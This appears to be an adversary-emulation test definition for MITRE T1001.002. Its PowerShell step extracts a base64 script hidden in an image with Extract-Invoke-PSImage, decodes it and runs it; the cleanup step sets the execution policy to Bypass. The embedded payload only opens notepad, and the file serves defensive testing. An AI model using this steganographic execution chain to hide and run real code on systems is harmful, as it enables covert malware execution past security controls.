api_version: "2.0"
name: Embedded Script in Image Execution via Extract-Invoke-PSImage
description: "This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. \nThe PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden \nwithin the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.\n\nThe test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This\nis done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. \n"
args:
    - name: image_file
      type: path
      default: PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg
    - name: psimage_script
      type: path
      default: PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1
uuid: 04bb8e3d-1670-46ab-a3f1-5cee64da29b6
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1001: Data Obfuscation'
    subtechniques:
        - 'T1001.002: Steganography'
requirements:
    platforms:
        - os: windows
steps:
    - name: embedded-script-in-image-execution-via-extract-invoke-psimage
      inline: "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"{{.Args.image_file}}\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"\n"
      executor: powershell
      cleanup:
        inline: "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore        \n"
        executor: powershell
